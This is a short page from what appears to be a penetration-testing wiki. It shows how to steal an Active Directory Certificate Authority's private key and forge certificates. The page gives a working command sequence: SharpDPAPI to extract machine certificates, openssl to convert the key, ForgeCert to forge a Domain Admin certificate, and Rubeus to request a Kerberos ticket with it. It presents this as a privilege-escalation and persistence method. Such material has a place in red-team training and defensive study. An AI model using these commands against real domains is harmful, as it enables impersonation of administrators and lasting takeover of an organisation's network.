---
layout: default
title: Forged Certificates
parent: Active Directory
nav_order: 1
permalink: /ad/forgedcert/
---

# Forged Certificates
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you are local administrator of a Certificate Authority server - *that might be deployed on another server than Domain Controller* - you can extract the CA private key to forge legit certificates. Since certificates are valid during **5 years** by default - *and generally at least 1 year* -, it is a great privilege escalation and persistence method.

## Prerequisites

* Local administrator rights on a Certificate Authority server (sometimes other than Domain Controller).

## Exploit

For this exploit, we will use [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [ForgeCert](https://github.com/GhostPack/ForgeCert) and [Rubeus](https://github.com/GhostPack/Rubeus).

```powershell
# Extract certificates of the machine.
.\SharpDPAPI.exe certificates /machine

# Save the private key and certificate to a .pem file then convert it to .pfx format.
openssl pkcs12 -inkey key.pem -in certificate.cert -export -out certificate.pfx

# Forge the certificate for the user you want to impersonate, i.e. Domain Admin of course.
.\ForgeCert.exe --CaCertPath certificate.pfx --CaCertPassword $whatever --Subject "CN=User" --SubjectAltName "$username@$domain" --NewCertPath .\Desktop\fake.pfx --NewCertPassword $whatever

# You can now request TGT with this fake certificate.
.\Rubeus.exe asktgt /user:$username /domain:$domain /enctype:aes256 /certificate:$cert /password:$password /nowrap.
```

You can also use this attack on domain computers, and combine it with [S4U2Self Abuse](/ad/s4u2self) to lateralize in the domain.